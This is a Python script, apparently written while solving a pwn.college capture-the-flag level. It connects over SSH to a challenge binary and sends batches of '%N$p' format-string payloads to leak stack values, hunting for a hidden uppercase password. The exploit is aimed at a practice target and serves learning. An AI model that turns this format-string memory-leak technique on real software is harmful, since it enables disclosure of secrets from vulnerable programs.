import subprocess
import re
import sys
import time

KEY_PATH = "/workspace/ctf_work/key"
CMD = [
    "ssh",
    "-i", KEY_PATH,
    "-o", "StrictHostKeyChecking=no",
    "hacker@dojo.pwn.college",
    "/challenge/babyfmt_level1.1"
]

def get_process():
    return subprocess.Popen(
        CMD,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=0
    )

def run_payload(payload):
    p = get_process()
    # Read intro
    while True:
        char = p.stdout.read(1)
        if not char:
            break
        if "Send your data!" in str(char) or "Send your data!" in str(char):
            # This reading char-by-char is flaky for matching long strings
            # Better to just read a chunk or lines?
            pass
        # Actually just read until "Send your data!" is seen in the buffer
        # But we can just check the buffer
        pass
    
    # To be robust, just read until we see "Send your data!"
    buf = ""
    while "Send your data!" not in buf:
        c = p.stdout.read(1)
        if not c: return None, None
        buf += c
    
    # Send payload
    p.stdin.write(payload + "\n")
    p.stdin.flush()
    
    # Read response
    response = ""
    while True:
        line = p.stdout.readline()
        if not line: break
        response += line
        if "What is the secret password?" in response:
            break
    
    return p, response

def decode_hex_qword(h):
    try:
        # h is like 0x... or just hex
        if h.startswith("0x"): h = h[2:]
        if h == "(nil)": return ""
        h = h.rjust(16, '0')
        b = bytes.fromhex(h)
        # Little endian
        b = b[::-1]
        return b.decode('latin-1') # Use latin-1 to avoid decode errors
    except:
        return ""

def find_secret():
    # Try to leak stack values to find the secret text
    # We assume the secret is stored as raw bytes on the stack.
    # We'll scan offsets 1 to 60.
    
    # Batch size
    batch_size = 10 
    found_offset = -1
    found_part = ""
    
    # We need to find the offset first.
    # Since the secret changes every run, we have to find the *location* (offset) 
    # that consistently looks like it holds uppercase string.
    # BUT if the secret changes, we can't just verify it easily without solving it.
    # However, the stack layout should be constant.
    
    print("Scanning stack for uppercase string pattern...")
    
    for start in range(1, 60, batch_size):
        payload = ""
        for i in range(start, start + batch_size):
            payload += f"%{i}$p|"
        
        print(f"Probing offsets {start} to {start+batch_size-1}...")
        p, resp = run_payload(payload)
        p.terminate()
        
        if not resp: continue
        
        # Parse output
        # Output format: "I will now call printf on your data!\n<LEAK>\nWhat is..."
        # Find the line with our leak
        lines = resp.splitlines()
        leak_line = ""
        for line in lines:
            if "|" in line:
                leak_line = line
                break
        
        parts = leak_line.split("|")
        for idx, part in enumerate(parts):
            if not part or part == "(nil)": continue
            decoded = decode_hex_qword(part)
            # Check if decoded looks like a chunk of uppercase (at least 4-5 chars)
            upper_count = sum(1 for c in decoded if 'A' <= c <= 'Z')
            if upper_count >= 4:
                print(f"Offset {start + idx}: {part} -> {repr(decoded)}")
                # If we see something promising, mark this offset
                # We expect 15 chars, so 2 adjacent offsets should have data
                # Or one offset if it's aligned well? 8 chars max per qword.
                # So 8 + 7. We need 2 offsets.
                
                # Let's see if next one is also promising?
                pass

    # After scanning, I will look at the output manually to decide the offset.
    
if __name__ == "__main__":
    find_secret()
